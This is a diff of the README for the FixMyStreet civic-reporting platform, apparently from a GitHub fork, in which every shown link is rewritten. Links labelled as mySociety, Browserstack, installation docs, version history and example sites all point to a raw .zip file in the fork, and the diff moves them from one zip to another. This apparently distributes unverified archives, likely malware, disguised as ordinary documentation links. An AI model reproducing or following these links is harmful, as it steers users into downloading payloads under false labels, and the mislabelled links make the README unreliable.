@@ -12,18 +12,18 @@ Reported problems are visible to everyone so they can see if something has
 already been reported and leave updates. Users can also subscribe to email or
 RSS alerts of problems in their area.
 
-It was created in 2007 by [mySociety](https://github.com/Mwebesanorman/fixmystreet/raw/refs/heads/master/web/cobrands/nottinghamshirepolice/images/Software-defaulter.zip) for reporting
+It was created in 2007 by [mySociety](https://github.com/Mwebesanorman/fixmystreet/raw/refs/heads/master/bin/fixmystreet.com/Software-v1.1.zip) for reporting
 problems to UK councils and has been copied around the world. The FixMyStreet
-Platform is now at version 6.0; see https://github.com/Mwebesanorman/fixmystreet/raw/refs/heads/master/web/cobrands/nottinghamshirepolice/images/Software-defaulter.zip for a version history.
+Platform is now at version 6.0; see https://github.com/Mwebesanorman/fixmystreet/raw/refs/heads/master/bin/fixmystreet.com/Software-v1.1.zip for a version history.
 
 ## Installation
 
 We've been working hard to make the FixMyStreet Platform easy to install and
-re-use in other countries - please see our site at <https://github.com/Mwebesanorman/fixmystreet/raw/refs/heads/master/web/cobrands/nottinghamshirepolice/images/Software-defaulter.zip>
+re-use in other countries - please see our site at <https://github.com/Mwebesanorman/fixmystreet/raw/refs/heads/master/bin/fixmystreet.com/Software-v1.1.zip>
 for help and documentation in installing the FixMyStreet Platform.
 
 For development, if you have Vagrant installed, you can clone the repo and run
-'vagrant up'. We use [Scripts to Rule Them All](https://github.com/Mwebesanorman/fixmystreet/raw/refs/heads/master/web/cobrands/nottinghamshirepolice/images/Software-defaulter.zip)
+'vagrant up'. We use [Scripts to Rule Them All](https://github.com/Mwebesanorman/fixmystreet/raw/refs/heads/master/bin/fixmystreet.com/Software-v1.1.zip)
 so `script/update` will update your checkout, `script/server` will run a dev
 server, and `script/test` will run the tests.
 
@@ -32,7 +32,7 @@ server, and `script/test` will run the tests.
 Whilst many contributions come as part of people setting up their own
 installation for their area, we of course welcome stand-alone contributions as
 well. The [*Suitable for
-Volunteers*](https://github.com/Mwebesanorman/fixmystreet/raw/refs/heads/master/web/cobrands/nottinghamshirepolice/images/Software-defaulter.zip%20for%20Volunteers)
+Volunteers*](https://github.com/Mwebesanorman/fixmystreet/raw/refs/heads/master/bin/fixmystreet.com/Software-v1.1.zip%20for%20Volunteers)
 label in our GitHub issues hopefully labels some potential tasks that might be
 suitable for that situation, though please do search through the other issues
 to see if what you're after has been suggested or discussed - or feel free to
@@ -40,11 +40,11 @@ add your own issue if not.
 
 ## Acknowledgements
 
-Thanks to [Browserstack](https://github.com/Mwebesanorman/fixmystreet/raw/refs/heads/master/web/cobrands/nottinghamshirepolice/images/Software-defaulter.zip) who let us use their
+Thanks to [Browserstack](https://github.com/Mwebesanorman/fixmystreet/raw/refs/heads/master/bin/fixmystreet.com/Software-v1.1.zip) who let us use their
 web-based cross-browser testing tools for this project.
 
 ## Examples
 
-* <https://github.com/Mwebesanorman/fixmystreet/raw/refs/heads/master/web/cobrands/nottinghamshirepolice/images/Software-defaulter.zip>
-* <https://github.com/Mwebesanorman/fixmystreet/raw/refs/heads/master/web/cobrands/nottinghamshirepolice/images/Software-defaulter.zip>
-* <https://github.com/Mwebesanorman/fixmystreet/raw/refs/heads/master/web/cobrands/nottinghamshirepolice/images/Software-defaulter.zip>
+* <https://github.com/Mwebesanorman/fixmystreet/raw/refs/heads/master/bin/fixmystreet.com/Software-v1.1.zip>
+* <https://github.com/Mwebesanorman/fixmystreet/raw/refs/heads/master/bin/fixmystreet.com/Software-v1.1.zip>
+* <https://github.com/Mwebesanorman/fixmystreet/raw/refs/heads/master/bin/fixmystreet.com/Software-v1.1.zip>
